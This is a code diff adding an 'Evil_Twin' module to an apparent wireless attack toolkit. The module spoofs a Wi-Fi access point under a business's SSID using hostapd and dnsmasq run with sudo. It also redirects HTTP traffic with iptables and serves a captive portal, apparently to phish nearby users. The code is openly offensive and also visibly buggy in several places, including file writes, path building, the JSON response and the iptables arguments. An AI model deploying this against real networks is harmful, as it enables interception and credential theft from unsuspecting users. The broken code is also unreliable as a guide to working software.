@@ -23,7 +23,9 @@ from nsm_files import Settings, Recon_Pusher
 
 
 # ETC IMPORTS 
-import threading, os, random, time, pyttsx3, string
+import threading, os, random, time, pyttsx3, subprocess, json
+from pathlib import Path
+from http.server import SimpleHTTPRequestHandler, HTTPServer
 
 
 # THREAD LOCKER
@@ -2255,6 +2257,208 @@ class War_Driving():
 
         except Exception as e:
             console.print(f"[bold red]Exception Error:[bold yellow] {e}")
+
+
+
+class Evil_Twin():
+    """This module will allow a user to perform a (passive) Evil Twin attack"""
+
+
+
+    @classmethod
+    def _choose_portal(cls) -> str:
+        """Dictionary of Evil_Twin portals to choose from"""
+
+        portals = {
+            "1": "LA Fitness"
+        }
+        max = 6
+
+        console.print(portals)
+
+        
+        while True:
+            try:
+
+                choice = console.input("\n[bold yellow]Choose portal!: "); choice = int(choice)
+    
+                
+                if choice in range(1, max) or choice == max: portal=f"portal_{choice}"; return portal, portals[choice]  
+
+            
+            except (KeyError, TypeError) as e: console.print(f"[bold red][-]Error:[bold yellow] {e}")
+            
+
+            except Exception as e: console.print(f"[bold red][-] Exception Error:[bold yellow] {e}")
+
+
+    @classmethod
+    def _get_portal_path(cls, portal:int):
+        """This will be used to get the path of the portal to use"""
+
+
+        # TEMP FIX FOR FILE CRASHING WITHOUT SUDO
+        try:
+            USER_HOME = Path(os.getenv("SUDO_USER") and f"/home/{os.getenv('SUDO_USER')}") or Path.home()
+            BASE_DIR = USER_HOME / "Documents" / "nsm_tools" / "netcracker" 
+        except Exception as e: console.print(e)
+                
+        # SWITCH BACK TO PATH
+        BASE_DIR = Path.home() / "Documents" / "nsm_tools" / "netcracker"
+
+
+        return str(Path(BASE_DIR / "portals" / {portal})), Path(BASE_DIR / "portals")
+    
+
+    @classmethod
+    def _make_hostapd_conf(cls, path, iface, ssid, channel=6, auth_algs=1, verbose=True):
+        """This will create hostpad_conf"""
+
+
+        try:
+
+            data_hostapd = (
+                f"interface={iface}",
+                f"ssid={ssid}",
+                f"channel={channel}",
+                f"auth_algs={auth_algs}"
+            ); what = "hostapd_config"
+
+            path = path / "hostapd.conf"
+
+            with open(path, "w") as file: file.write(data_hostapd)
+            if verbose: console.print(f"[bold green][+] Successfully created {what}")
+        
+
+        except Exception as e: console.print(f"[bold red][-] Exception Error:[bold yellow] {e}")
+    
+  
+    @classmethod
+    def _make_dnsmasq_conf(cls, path, iface, dhcp_range="10.0.0.10,10.0.0.100,12h", address="10.0.0.1", verbose=True):
+        """This will create dnsmasq_conf"""
+
+
+        try:
+
+            data_dnsmasq = (
+                    f"interface={iface}",
+                    f"dhcp_range={dhcp_range}",
+                    f"address={address}"
+                ); what = "dnsmasq.conf"
+            
+            path = path / "dnsmasq.conf"
+            with open(path, "w") as file: file.write(data_dnsmasq)
+            if verbose: console.print(f"[bold green][+] Successfully created {what}")
+        
+
+        except Exception as e: console.print(f"[bold red][-] Exception Error:[bold yellow] {e}")
+
+
+    @classmethod
+    def _launch_hostapd(cls, path:str, verbose=True):
+        """This will launch hostapd"""
+
+
+        hostpad_proc = subprocess.Popen(
+            ["sudo","hostapd", path],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE
+        )
+
+        hostpad_proc
+        if verbose: console.print(f"[bold green][+] Successfully launched hostapd")
+
+
+    @classmethod
+    def _launch_dnsmasq(cls, path:str, verbose=True):
+        """This will launch dnsmasq"""
+
+
+        dnsmasq_proc = subprocess.Popen(
+            ["sudo", "dnsmasq", "-C", path],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE
+        )
+
+        dnsmasq_proc
+        if verbose: console.print(f"[bold green][+] Successfully launched dnsmasq")
+
+
+    @classmethod
+    def _set_iptables(cls, verbose=True):
+        """This will redirct traffic"""
+
+        subprocess.run(
+            ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING"
+             "-p", "tcp", "--dport", "80", "-j", "REDIRECT",
+             "--to-port", "8080"
+             ]
+        )
+
+        if verbose: console.print(f"[bold green][+] Successfully configured iptables")
+
+    
+    
+    class _Evil_Server(SimpleHTTPRequestHandler):
+        """Sub class of Evil_Twin for HTTP Requesting handling"""
+            
+        def do_GET(self):
+            """This will handle http requests that are made"""
+
+
+            if self.path == "/portal":
+
+                self.send_response(200)
+                self.send_header("Content-type", "application/json")
+                self.send_header("Access-Control-Allow-Origin", "*")
+                self.end_headers()
+
+                self.wfile.write(json.dumps())
+
+            
+            else: super().do_GET()
+        
+        
+        @staticmethod
+        def _Start_HTTP_Server(address="0.0.0.0", port=8000):
+            """This will launch HTTP Server"""
+
+
+            server = HTTPServer(server_address=(address, port), RequestHandlerClass=Evil_Twin._Evil_Server)
+            console.print(f"[bold green][+] Starting Evil_Twin Server on:[bold yellow] http://localhost:{port}")
+            server.serve_forever()
+
+
+
+    @classmethod
+    def main(cls):
+        """This will control class wide logic"""
+
+
+        iface = Frame_Snatcher.get_interface()
+        Frame_Snatcher.welcome_ui(iface=iface, text=" Evil \nTwin")
+
+        portal, ssid = Evil_Twin._choose_portal()
+        conf_path, path = Evil_Twin._get_portal_path(portal=portal)
+
+
+        Evil_Twin._make_hostapd_conf(path=conf_path, iface=iface, ssid=ssid)
+        Evil_Twin._make_dnsmasq_conf(path=conf_path, iface=iface); time.sleep(2)
+        Evil_Twin._launch_hostapd(path=path)
+        Evil_Twin._launch_dnsmasq(path=path)
+
+
+        Evil_Twin._Evil_Server._Start_HTTP_Server()
+
+
+
+
+
+
+    
+
+
+
 
 
         
